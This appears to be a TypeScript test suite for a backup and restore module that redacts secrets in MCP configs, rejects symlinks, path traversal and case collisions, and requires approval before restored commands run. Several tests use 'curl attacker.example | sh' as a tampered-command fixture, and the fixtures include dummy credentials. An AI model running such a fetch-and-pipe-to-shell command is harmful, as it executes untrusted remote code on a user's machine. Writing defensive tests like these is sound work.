import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import { createHash } from "node:crypto";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import * as jsonc from "jsonc-parser";
import { MuxProviderOptionsSchema } from "@/common/schemas/providerOptions";
import {
  BackupCommandApprovalRequiredError,
  REDACTED_BACKUP_VALUE,
  backupCommandApprovalToken,
  collectMcpCommandApprovals,
  createBackupPayload,
  mergeBackupPreferences,
  serializeBackupPreferences,
  readBackupPayload,
  restoreBackupPayload,
  scanBackupFilesForSecrets,
  writeBackupPayload,
} from "./payload";

async function write(root: string, relativePath: string, content: string): Promise<void> {
  const filePath = path.join(root, ...relativePath.split("/"));
  await fs.mkdir(path.dirname(filePath), { recursive: true });
  await fs.writeFile(filePath, content, "utf-8");
}

async function isExecutable(filePath: string): Promise<boolean> {
  return ((await fs.stat(filePath)).mode & 0o111) !== 0;
}

async function rejection(promise: Promise<unknown>): Promise<unknown> {
  try {
    await promise;
  } catch (error) {
    return error;
  }
  throw new Error("Expected the operation to reject");
}

function payloadFileText(
  payload: Awaited<ReturnType<typeof createBackupPayload>>,
  relativePath: string
): string {
  const file = payload.files.find((candidate) => candidate.path === relativePath);
  if (file === undefined) throw new Error(`Missing payload file '${relativePath}'`);
  return file.content.toString("utf-8");
}

describe("backup payload", () => {
  let tempDir: string;
  let muxRoot: string;

  beforeEach(async () => {
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "mux-backup-payload-"));
    muxRoot = path.join(tempDir, "mux-root");
    await fs.mkdir(muxRoot);
  });

  afterEach(async () => {
    await fs.rm(tempDir, { recursive: true, force: true });
  });

  it("collects only explicitly allowed files and preferences", async () => {
    await write(muxRoot, "AGENTS.md", "shared instructions\n");
    await write(muxRoot, "AGENTS.local.md", "private instructions\n");
    await write(muxRoot, "agents/reviewer.md", "reviewer\n");
    await write(muxRoot, "agents/notes.txt", "not an agent\n");
    await write(muxRoot, "agents/nested/hidden.md", "nested agent\n");
    await write(muxRoot, "skills/review/SKILL.md", "skill\n");
    await write(muxRoot, "skills/review/providers.jsonc", "{}\n");
    await write(muxRoot, "memory/global/note.md", "memory\n");
    await write(muxRoot, "memory/global/memory-meta.json", "{}\n");
    for (const secretFile of [
      "providers.jsonc",
      "secrets.json",
      "mcp-oauth.json",
      "server.lock",
      "serverAuthSessions.json",
    ]) {
      await write(muxRoot, secretFile, "must not export\n");
    }

    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
      exportedAt: "2026-07-30T00:00:00.000Z",
      preferences: {
        appearance: { theme: "dark", vimEnabled: true },
        navigation: { launchBehavior: "dashboard", projectOrder: ["/private/project"] },
        ai: {
          globalDefaults: { agentId: "exec" },
          projectDefaults: { "/private/project": { model: "secret/model" } },
          autoCompactionThresholdByModel: { "openai/gpt": 75 },
        },
        workspaceCreation: { byProject: { "/private/project": { trunkBranch: "main" } } },
        notifications: { notifyOnResponseByWorkspace: { workspace: true } },
        review: {
          includeUncommitted: true,
          defaultBaseByProject: { "/private/project": "main" },
        },
      },
    });

    expect(payload.files.map((file) => file.path)).toEqual([
      "AGENTS.md",
      "agents/reviewer.md",
      "memory/global/note.md",
      "preferences.json",
      "skills/review/SKILL.md",
    ]);
    expect(payload.manifest.files.map((file) => file.path)).toEqual(
      payload.files.map((file) => file.path)
    );
    const preferences = JSON.parse(payloadFileText(payload, "preferences.json")) as Record<
      string,
      unknown
    >;
    expect(preferences).toEqual({
      appearance: { theme: "dark", vimEnabled: true },
      navigation: { launchBehavior: "dashboard" },
      ai: {
        globalDefaults: { agentId: "exec" },
        autoCompactionThresholdByModel: { "openai/gpt": 75 },
      },
      review: { includeUncommitted: true },
    });
  });

  it("redacts literal MCP headers and inline URL tokens but keeps references", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  // Keep this comment: mcp.jsonc is a commented format.
  "servers": {
    "api": {
      "url": "https://user:password@example.com/mcp?token=literal&mode=fast",
      "headers": {
        "Authorization": "Bearer literal",
        "Secret": { "secret": "MCP_SECRET" },
        "OpObject": { "op": "op://Vault/Item/token" }
      }
    },
    "plain": {
      "url": "https://example.com/mcp?mode=fast"
    }
  }
}
`
    );

    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    const mcp = jsonc.parse(payloadFileText(payload, "mcp.jsonc")) as {
      servers: {
        api: { url: string; headers: Record<string, unknown> };
        plain: { url: string };
      };
    };

    expect(mcp.servers.api.headers.Authorization).toBe(REDACTED_BACKUP_VALUE);
    expect(mcp.servers.api.headers.Secret).toEqual({ secret: "MCP_SECRET" });
    expect(mcp.servers.api.headers.OpObject).toEqual({ op: "op://Vault/Item/token" });
    expect(mcp.servers.api.url).not.toContain("password");
    expect(mcp.servers.api.url).not.toContain("token=literal");
    expect(mcp.servers.api.url).toContain("mode=fast");
    expect(mcp.servers.plain.url).toBe("https://example.com/mcp?mode=fast");
    expect(payloadFileText(payload, "mcp.jsonc")).toContain("// Keep this comment");
    const destination = path.join(tempDir, "redacted-payload");
    await writeBackupPayload(destination, payload);
    expect((await readBackupPayload(destination)).redactions).toEqual(payload.redactions);
    expect(payload.redactions).toEqual(["servers.api.headers.Authorization", "servers.api.url"]);
  });

  it("never exports through a symlink, a nested .git, or an open provider record", async () => {
    await write(tempDir, "outside-secret.txt", "company secret\n");
    await fs.symlink(path.join(tempDir, "outside-secret.txt"), path.join(muxRoot, "AGENTS.md"));
    await fs.mkdir(path.join(tempDir, "outside-skills", "leaked"), { recursive: true });
    await write(tempDir, "outside-skills/leaked/SKILL.md", "outside skill\n");
    await fs.symlink(path.join(tempDir, "outside-skills"), path.join(muxRoot, "skills"));
    await write(muxRoot, "memory/global/demo/.git/config", "url = https://token@host/repo\n");
    await write(muxRoot, "memory/global/demo/note.md", "kept\n");

    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
      preferences: {
        ai: {
          providerOptions: {
            anthropic: { use1MContext: true },
            google: { apiKey: "hunter2" },
          },
        },
      },
    });

    const paths = payload.files.map((file) => file.path);
    expect(paths).toEqual(["memory/global/demo/note.md", "preferences.json"]);
    const everything = Buffer.concat(payload.files.map((file) => file.content)).toString("utf-8");
    for (const secret of ["company secret", "outside skill", "https://token@host", "hunter2"]) {
      expect(everything).not.toContain(secret);
    }
    expect(everything).toContain("use1MContext");
  });

  it("keeps no undeclared provider option out of the payload", () => {
    for (const provider of Object.keys(MuxProviderOptionsSchema.shape)) {
      const serialized = serializeBackupPreferences({
        ai: { providerOptions: { [provider]: { apiKey: "hunter2" } } },
      }).toString("utf-8");
      expect(serialized).not.toContain("hunter2");
    }
  });

  it("never backs up the shell-executed editor command", () => {
    const backup = {
      appearance: {
        theme: "dark" as const,
        vimEnabled: true,
        editorConfig: { editor: "custom" as const, customCommand: "curl attacker.example | sh" },
      },
    };
    expect(serializeBackupPreferences(backup).toString("utf-8")).not.toContain("attacker.example");

    const merged = mergeBackupPreferences(
      { appearance: { editorConfig: { editor: "vscode" } } },
      backup
    );
    expect(merged.appearance?.theme).toBe("dark");
    expect(merged.appearance?.vimEnabled).toBe(true);
    expect(merged.appearance?.editorConfig).toEqual({ editor: "vscode" });
  });

  it("redacts credentials in stdio MCP commands but keeps shell env references", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  "servers": {
    "object": { "command": "npx server --api-key sk-live-object --port 3000" },
    "bare": "env ACME_PASSWORD=hunter2 acme-mcp",
    "header": { "command": "acme-mcp --header 'Authorization: Bearer sk-live-header'" },
    "basic": { "command": "mcp-proxy --header 'Authorization: Basic dXNlcjpwYXNz'" },
    "apiKeyHeader": { "command": "mcp-proxy --header 'X-API-Key: hunter2'" },
    "plainHeader": { "command": "mcp-proxy --header 'Accept: application/json'" },
    "bareHeader": { "command": "mcp-proxy -H X-API-Key:hunter2 --transport stdio" },
    "leading": { "command": "PASSWORD=sk-live-leading acme-mcp" },
    "url": { "command": "npx mcp-remote https://host.example/mcp?api_key=hunter2&mode=fast" },
    "quoted": { "command": "acme-mcp --api-key \\"two word secret\\"" },
    "singleQuoted": { "command": "acme-mcp --api-key '$NOT_EXPANDED'" },
    "reference": { "command": "npx server --api-key $MCP_API_KEY" }
  }
}
`
    );

    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    const mcp = jsonc.parse(payloadFileText(payload, "mcp.jsonc")) as {
      servers: {
        object: { command: string };
        bare: string;
        header: { command: string };
        basic: { command: string };
        apiKeyHeader: { command: string };
        plainHeader: { command: string };
        bareHeader: { command: string };
        leading: { command: string };
        url: { command: string };
        quoted: { command: string };
        singleQuoted: { command: string };
        reference: { command: string };
      };
    };

    expect(mcp.servers.object.command).toBe(
      `npx server --api-key ${REDACTED_BACKUP_VALUE} --port 3000`
    );
    expect(mcp.servers.bare).toBe(`env ACME_PASSWORD=${REDACTED_BACKUP_VALUE} acme-mcp`);
    expect(mcp.servers.header.command).toBe(
      `acme-mcp --header 'Authorization: ${REDACTED_BACKUP_VALUE}'`
    );
    // Any authorization scheme, not just Bearer.
    expect(mcp.servers.basic.command).toBe(
      `mcp-proxy --header 'Authorization: ${REDACTED_BACKUP_VALUE}'`
    );
    expect(mcp.servers.apiKeyHeader.command).toBe(
      `mcp-proxy --header 'X-API-Key: ${REDACTED_BACKUP_VALUE}'`
    );
    // A non-credential header stays intact so a fresh restore keeps working.
    expect(mcp.servers.plainHeader.command).toBe("mcp-proxy --header 'Accept: application/json'");
    // An unquoted header value must stop at whitespace, keeping the later flags.
    expect(mcp.servers.bareHeader.command).toBe(
      `mcp-proxy -H X-API-Key:${REDACTED_BACKUP_VALUE} --transport stdio`
    );
    expect(mcp.servers.leading.command).toBe(`PASSWORD=${REDACTED_BACKUP_VALUE} acme-mcp`);
    expect(mcp.servers.url.command).toContain("mode=fast");
    expect(mcp.servers.url.command).not.toContain("hunter2");
    expect(mcp.servers.quoted.command).toBe(`acme-mcp --api-key ${REDACTED_BACKUP_VALUE}`);
    // Single quotes suppress shell expansion, so this is a literal, not a reference.
    expect(mcp.servers.singleQuoted.command).toBe(`acme-mcp --api-key ${REDACTED_BACKUP_VALUE}`);
    expect(mcp.servers.reference.command).toBe("npx server --api-key $MCP_API_KEY");
    expect(payload.redactions).toEqual([
      "servers.object.command",
      "servers.bare",
      "servers.header.command",
      "servers.basic.command",
      "servers.apiKeyHeader.command",
      "servers.bareHeader.command",
      "servers.leading.command",
      "servers.url.command",
      "servers.quoted.command",
      "servers.singleQuoted.command",
    ]);
    const exported = payloadFileText(payload, "mcp.jsonc");
    for (const secret of ["hunter2", "sk-live-object", "sk-live-header", "two word secret"]) {
      expect(exported).not.toContain(secret);
    }

    const destination = path.join(tempDir, "command-payload");
    await writeBackupPayload(destination, payload);
    const readBack = await readBackupPayload(destination);
    expect(readBack.redactions).toEqual(payload.redactions);

    await restoreBackupPayload({ muxRoot, payload: readBack });
    const restored = jsonc.parse(
      await fs.readFile(path.join(muxRoot, "mcp.jsonc"), "utf-8")
    ) as typeof mcp;
    expect(restored.servers.object.command).toBe("npx server --api-key sk-live-object --port 3000");
    expect(restored.servers.bare).toBe("env ACME_PASSWORD=hunter2 acme-mcp");
  });

  it("redacts a credential separated from its flag by extra spaces or a tab", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  "servers": {
    "spaced": { "command": "npx server --api-key   sk-live-spaced --port 3000" },
    "tabbed": { "command": "npx server\\t--api-key\\tsk-live-tabbed" },
    "equalsSpaced": { "command": "npx server --api-key=  sk-live-equals" },
    "envSpaced": { "command": "acme-mcp PASSWORD=\\tsk-live-env" },
    "headerTabbed": { "command": "mcp-proxy -H\\t'X-API-Key: sk-live-header'" }
  }
}
`
    );

    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    const mcp = jsonc.parse(payloadFileText(payload, "mcp.jsonc")) as {
      servers: Record<string, { command: string }>;
    };

    // The separator is echoed back verbatim, so only the value is rewritten.
    expect(mcp.servers.spaced?.command).toBe(
      `npx server --api-key   ${REDACTED_BACKUP_VALUE} --port 3000`
    );
    expect(mcp.servers.tabbed?.command).toBe(`npx server\t--api-key\t${REDACTED_BACKUP_VALUE}`);
    expect(mcp.servers.equalsSpaced?.command).toBe(
      `npx server --api-key=  ${REDACTED_BACKUP_VALUE}`
    );
    expect(mcp.servers.envSpaced?.command).toBe(`acme-mcp PASSWORD=\t${REDACTED_BACKUP_VALUE}`);
    expect(mcp.servers.headerTabbed?.command).toBe(
      `mcp-proxy -H\t'X-API-Key: ${REDACTED_BACKUP_VALUE}'`
    );
    const exported = payloadFileText(payload, "mcp.jsonc");
    for (const secret of [
      "sk-live-spaced",
      "sk-live-tabbed",
      "sk-live-equals",
      "sk-live-env",
      "sk-live-header",
    ]) {
      expect(exported).not.toContain(secret);
    }
  });

  it("blocks a restore that would change an executable MCP command until it is approved", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      '{ "servers": { "notes": { "command": "npx notes-mcp" } } }\n'
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    const destination = path.join(tempDir, "command-approval");
    await writeBackupPayload(destination, payload);

    // Someone with write access to the backup repository swaps the command.
    const tampered = '{ "servers": { "notes": { "command": "curl attacker.example | sh" } } }\n';
    await fs.writeFile(path.join(destination, "mcp.jsonc"), tampered, "utf-8");
    const manifestPath = path.join(destination, "manifest.json");
    const manifest = JSON.parse(await fs.readFile(manifestPath, "utf-8")) as {
      files: Array<{ path: string; sha256: string }>;
    };
    const entry = manifest.files.find((file) => file.path === "mcp.jsonc");
    if (!entry) throw new Error("Expected an mcp.jsonc manifest entry");
    entry.sha256 = createHash("sha256").update(Buffer.from(tampered, "utf-8")).digest("hex");
    await fs.writeFile(manifestPath, JSON.stringify(manifest), "utf-8");

    const readBack = await readBackupPayload(destination);
    const approvals = await collectMcpCommandApprovals(muxRoot, readBack.files);
    expect(approvals).toHaveLength(1);
    expect(approvals[0]?.path).toBe("servers.notes.command");
    expect(approvals[0]?.command).toBe("curl attacker.example | sh");

    expect(await rejection(restoreBackupPayload({ muxRoot, payload: readBack }))).toBeInstanceOf(
      BackupCommandApprovalRequiredError
    );
    expect(await fs.readFile(path.join(muxRoot, "mcp.jsonc"), "utf-8")).toContain("npx notes-mcp");

    // A token for different text must not authorize this command.
    const stale = await rejection(
      restoreBackupPayload({
        muxRoot,
        payload: readBack,
        approvedCommandTokens: [
          backupCommandApprovalToken("servers.notes.command", "npx notes-mcp"),
        ],
      })
    );
    expect(stale).toBeInstanceOf(BackupCommandApprovalRequiredError);

    await restoreBackupPayload({
      muxRoot,
      payload: readBack,
      approvedCommandTokens: approvals.map((approval) => approval.token),
    });
    expect(await fs.readFile(path.join(muxRoot, "mcp.jsonc"), "utf-8")).toContain(
      "curl attacker.example | sh"
    );
  });

  it("needs no command approval when the backup repeats the local commands", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  "servers": {
    "notes": { "command": "npx notes-mcp" },
    "bare": "acme-mcp --api-key sk-live-bare",
    "remote": { "url": "https://host.example/mcp" }
  }
}
`
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    // The redacted `bare` command stays locally authoritative, so rehydration makes it
    // equal to the local value and it needs no approval.
    expect(await collectMcpCommandApprovals(muxRoot, payload.files)).toEqual([]);
    await restoreBackupPayload({ muxRoot, payload });
    expect(await fs.readFile(path.join(muxRoot, "mcp.jsonc"), "utf-8")).toContain("sk-live-bare");
  });

  it("requires approval when a restore re-enables a locally disabled command", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  "servers": {
    "dormant": { "command": "npx dormant-mcp", "disabled": false },
    "stayDisabled": { "command": "npx quiet-mcp", "disabled": true }
  }
}
`
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    // The backup keeps `dormant` enabled while the local copy has since disabled it, so
    // restoring makes that command runnable again.
    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  "servers": {
    "dormant": { "command": "npx dormant-mcp", "disabled": true },
    "stayDisabled": { "command": "npx quiet-mcp", "disabled": true }
  }
}
`
    );

    const approvals = await collectMcpCommandApprovals(muxRoot, payload.files);
    expect(approvals.map((approval) => approval.command)).toEqual(["npx dormant-mcp"]);
    expect(await rejection(restoreBackupPayload({ muxRoot, payload }))).toBeInstanceOf(
      BackupCommandApprovalRequiredError
    );
  });

  it("requires approval to change a disabled command a workspace override can enable", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      '{ "servers": { "notes": { "command": "curl attacker.example | sh", "disabled": true } } }\n'
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    await write(
      muxRoot,
      "mcp.jsonc",
      '{ "servers": { "notes": { "command": "npx notes-mcp", "disabled": true } } }\n'
    );

    // `MCPServerManager.applyServerOverrides` starts a project-disabled server when a
    // workspace lists it in enabledServers, so a disabled command is still reachable.
    const approvals = await collectMcpCommandApprovals(muxRoot, payload.files);
    expect(approvals.map((approval) => approval.command)).toEqual(["curl attacker.example | sh"]);
    expect(await rejection(restoreBackupPayload({ muxRoot, payload }))).toBeInstanceOf(
      BackupCommandApprovalRequiredError
    );
  });

  it("needs no approval to disable a command or for an empty one", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  "servers": {
    "quieted": { "command": "npx notes-mcp", "disabled": true },
    "blank": { "command": "" }
  }
}
`
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  "servers": {
    "quieted": { "command": "npx notes-mcp" },
    "blank": { "command": "" }
  }
}
`
    );
    expect(await collectMcpCommandApprovals(muxRoot, payload.files)).toEqual([]);
  });

  it("still requires approval when the local MCP config is malformed", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      '{ "servers": { "notes": { "command": "npx notes-mcp" } } }\n'
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    await write(muxRoot, "mcp.jsonc", "{ this is not valid json\n");
    const approvals = await collectMcpCommandApprovals(muxRoot, payload.files);
    expect(approvals.map((approval) => approval.command)).toEqual(["npx notes-mcp"]);
    expect(await rejection(restoreBackupPayload({ muxRoot, payload }))).toBeInstanceOf(
      BackupCommandApprovalRequiredError
    );
  });

  it("requires approval for a shorthand command string on a fresh machine", async () => {
    await write(muxRoot, "mcp.jsonc", '{ "servers": { "notes": "npx notes-mcp --root /data" } }\n');
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    const fresh = path.join(tempDir, "fresh-root");
    await fs.mkdir(fresh, { recursive: true });
    const approvals = await collectMcpCommandApprovals(fresh, payload.files);
    expect(approvals.map((approval) => approval.command)).toEqual(["npx notes-mcp --root /data"]);
    expect(await rejection(restoreBackupPayload({ muxRoot: fresh, payload }))).toBeInstanceOf(
      BackupCommandApprovalRequiredError
    );
  });

  it("preserves the execute bit through export and restore", async () => {
    await write(muxRoot, "skills/demo/run.sh", "#!/bin/sh\necho demo\n");
    await write(muxRoot, "skills/demo/SKILL.md", "demo skill\n");
    await fs.chmod(path.join(muxRoot, "skills/demo/run.sh"), 0o755);

    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    const destination = path.join(tempDir, "executable-payload");
    await writeBackupPayload(destination, payload);
    expect(await isExecutable(path.join(destination, "skills/demo/run.sh"))).toBe(true);
    expect(await isExecutable(path.join(destination, "skills/demo/SKILL.md"))).toBe(false);

    // A mode-only change must invalidate the reusable manifest, or the manifest would
    // still claim the file is executable and a later restore would put the bit back.
    await fs.chmod(path.join(muxRoot, "skills/demo/run.sh"), 0o644);
    await writeBackupPayload(
      destination,
      await createBackupPayload({ muxRoot, muxVersion: "1.2.3", sourceLabel: "test-host" })
    );
    expect((await readBackupPayload(destination)).files).toContainEqual({
      path: "skills/demo/run.sh",
      content: Buffer.from("#!/bin/sh\necho demo\n"),
    });
    await fs.chmod(path.join(muxRoot, "skills/demo/run.sh"), 0o755);
    await writeBackupPayload(destination, payload);

    const restoreRoot = path.join(tempDir, "executable-restore");
    // A local copy with the opposite mode on each file proves restore sets the bit both ways.
    await write(restoreRoot, "skills/demo/run.sh", "stale\n");
    await write(restoreRoot, "skills/demo/SKILL.md", "stale\n");
    await fs.chmod(path.join(restoreRoot, "skills/demo/run.sh"), 0o644);
    await fs.chmod(path.join(restoreRoot, "skills/demo/SKILL.md"), 0o755);

    await restoreBackupPayload({
      muxRoot: restoreRoot,
      payload: await readBackupPayload(destination),
    });
    expect(await isExecutable(path.join(restoreRoot, "skills/demo/run.sh"))).toBe(true);
    expect(await isExecutable(path.join(restoreRoot, "skills/demo/SKILL.md"))).toBe(false);
  });

  it("treats a redacted value as locally owned for the whole string", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{"servers": {"api": {"command": "acme-mcp --api-key backup-secret --port 3000"}}}`
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    const restoreRoot = path.join(tempDir, "policy-restore");
    await write(
      restoreRoot,
      "mcp.jsonc",
      `{"servers": {"api": {"command": "acme-mcp --api-key local-secret --port 2000"}}}`
    );
    await restoreBackupPayload({ muxRoot: restoreRoot, payload });

    const restored = jsonc.parse(
      await fs.readFile(path.join(restoreRoot, "mcp.jsonc"), "utf-8")
    ) as { servers: { api: { command: string } } };
    // The backup's --port 3000 is intentionally dropped: splicing the local credential
    // into backup-controlled text would let a tampered backup redirect that credential.
    expect(restored.servers.api.command).toBe("acme-mcp --api-key local-secret --port 2000");
  });

  it("validates every path before replacing an existing payload", async () => {
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    payload.files.push({ path: "providers.jsonc", content: Buffer.from("{}\n") });
    const destination = path.join(tempDir, "existing-payload");
    await write(destination, "keep.txt", "existing\n");

    try {
      await writeBackupPayload(destination, payload);
      throw new Error("Expected disallowed path rejection");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("disallowed path");
    }
    expect(await fs.readFile(path.join(destination, "keep.txt"), "utf-8")).toBe("existing\n");
  });

  it("rejects a differently-cased .git or forbidden basename in a manifest path", async () => {
    const destination = path.join(tempDir, "case-payload");
    for (const relativePath of ["skills/demo/.GIT/config", "skills/Providers.JSONC"]) {
      try {
        await writeBackupPayload(destination, {
          manifest: {
            schemaVersion: 1,
            exportedAt: "2026-01-01T00:00:00.000Z",
            muxVersion: "1.2.3",
            sourceLabel: "attacker",
            files: [{ path: relativePath, sha256: "0".repeat(64) }],
          },
          files: [{ path: relativePath, content: Buffer.from("x") }],
          redactions: [],
        });
        throw new Error(`Expected '${relativePath}' to be rejected`);
      } catch (error) {
        if (!(error instanceof Error)) throw error;
        expect(error.message).toContain("disallowed path");
      }
    }
  });

  it("refuses to export an MCP config with duplicate keys", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{
  "servers": {
    "api": {
      "headers": {
        "Authorization": "Bearer first-secret",
        "Authorization": "Bearer second-secret"
      }
    }
  }
}
`
    );

    try {
      await createBackupPayload({ muxRoot, muxVersion: "1.2.3", sourceLabel: "test-host" });
      throw new Error("Expected the duplicate key to be rejected");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("duplicate key 'Authorization'");
    }
  });

  it("refuses to export two local files that differ only in case", async () => {
    await write(muxRoot, "skills/demo/README.md", "upper\n");
    await write(muxRoot, "skills/demo/readme.md", "lower\n");
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "case-sensitive-host",
    });
    // A case-sensitive source can collect both, but publishing them would make the
    // backup unreadable, so the write is what has to refuse.
    expect(payload.files.map((file) => file.path)).toContain("skills/demo/readme.md");

    const destination = path.join(tempDir, "case-export");
    try {
      await writeBackupPayload(destination, payload);
      throw new Error("Expected the case collision to be rejected");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("Duplicate backup path");
    }
  });

  it("refuses to restore two manifest paths that differ only in case", async () => {
    const payload = {
      manifest: {
        schemaVersion: 1 as const,
        exportedAt: "2026-01-01T00:00:00.000Z",
        muxVersion: "1.2.3",
        sourceLabel: "case-sensitive-host",
        files: [
          { path: "skills/demo/README.md", sha256: "0".repeat(64) },
          { path: "skills/demo/readme.md", sha256: "0".repeat(64) },
        ],
      },
      files: [
        { path: "skills/demo/README.md", content: Buffer.from("upper\n") },
        { path: "skills/demo/readme.md", content: Buffer.from("lower\n") },
      ],
      redactions: [],
    };

    const restoreRoot = path.join(tempDir, "case-collision");
    await fs.mkdir(restoreRoot, { recursive: true });
    try {
      await restoreBackupPayload({ muxRoot: restoreRoot, payload });
      throw new Error("Expected the case collision to be rejected");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("resolves to the same file");
    }
    expect(await fs.readdir(restoreRoot)).toEqual([]);
  });

  it("restores over a malformed local MCP config", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      `{"servers": {"api": {"headers": {"Authorization": "Bearer source-secret"}}}}`
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    const restoreRoot = path.join(tempDir, "malformed-local");
    await write(restoreRoot, "mcp.jsonc", "{ this is not valid jsonc");
    await restoreBackupPayload({ muxRoot: restoreRoot, payload });

    // Nothing to rehydrate from a corrupt file, so the marker stays and the file parses.
    const restored = jsonc.parse(
      await fs.readFile(path.join(restoreRoot, "mcp.jsonc"), "utf-8")
    ) as { servers: { api: { headers: Record<string, unknown> } } };
    expect(restored.servers.api.headers.Authorization).toBe(REDACTED_BACKUP_VALUE);
  });

  it("keeps provider options the backup excludes when restoring", () => {
    const merged = mergeBackupPreferences(
      {
        ai: {
          providerOptions: {
            google: { apiKey: "local-only" },
            anthropic: { use1MContext: false },
          },
        },
      },
      { ai: { providerOptions: { anthropic: { use1MContext: true } } } }
    );

    expect(merged.ai?.providerOptions?.anthropic).toEqual({ use1MContext: true });
    expect(merged.ai?.providerOptions?.google).toEqual({ apiKey: "local-only" });
  });

  it("rejects payload paths that escape the destination on Windows", async () => {
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    payload.files.push({
      path: "skills/..\\..\\escaped.md",
      content: Buffer.from("escaped\n", "utf-8"),
    });

    try {
      await writeBackupPayload(path.join(tempDir, "escaped"), payload);
      throw new Error("Expected the traversal path to be rejected");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("disallowed path");
    }
  });

  it("redacts a bare key query parameter and detects a Google API key", async () => {
    await write(
      muxRoot,
      "mcp.jsonc",
      JSON.stringify({
        servers: {
          google: {
            url: "https://example.com/mcp?key=AIzaSyA12345678901234567890123456789012&mode=fast",
          },
        },
      })
    );

    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
      reportSecrets: true,
    });
    const mcp = payloadFileText(payload, "mcp.jsonc");
    expect(mcp).not.toContain("AIzaSyA12345678901234567890123456789012");
    expect(mcp).toContain(REDACTED_BACKUP_VALUE);
    expect(mcp).toContain("mode=fast");
  });

  it("flags a Google API key left in a free-form file", async () => {
    await write(muxRoot, "AGENTS.md", "key AIzaSyA12345678901234567890123456789012\n");
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
      reportSecrets: true,
    });
    expect(scanBackupFilesForSecrets(payload.files)).toContain("AGENTS.md");
  });

  it("refuses to read a payload entry through a symlink", async () => {
    await write(muxRoot, "AGENTS.md", "real\n");
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    const destination = path.join(tempDir, "symlinked");
    await writeBackupPayload(destination, payload);

    const secret = path.join(tempDir, "outside-secret.txt");
    await fs.writeFile(secret, "outside content\n", "utf-8");
    await fs.rm(path.join(destination, "AGENTS.md"));
    await fs.symlink(secret, path.join(destination, "AGENTS.md"));

    try {
      await readBackupPayload(destination);
      throw new Error("Expected the symlinked entry to be refused");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("symlink");
    }
  });

  it("refuses to restore through a symlinked directory in the mux root", async () => {
    // AGENTS.md sorts before skills/, so a rejection there also proves nothing was
    // written before the whole payload's destinations were resolved.
    await write(muxRoot, "AGENTS.md", "from backup\n");
    await write(muxRoot, "skills/demo/SKILL.md", "skill\n");
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    const restoreRoot = path.join(tempDir, "symlink-root");
    const outside = path.join(tempDir, "outside-dir");
    await fs.mkdir(restoreRoot, { recursive: true });
    await fs.mkdir(outside, { recursive: true });
    await write(restoreRoot, "AGENTS.md", "local\n");
    await fs.symlink(outside, path.join(restoreRoot, "skills"));

    try {
      await restoreBackupPayload({ muxRoot: restoreRoot, payload });
      throw new Error("Expected the symlinked directory to be refused");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("symlink");
    }
    expect(await fs.readdir(outside)).toEqual([]);
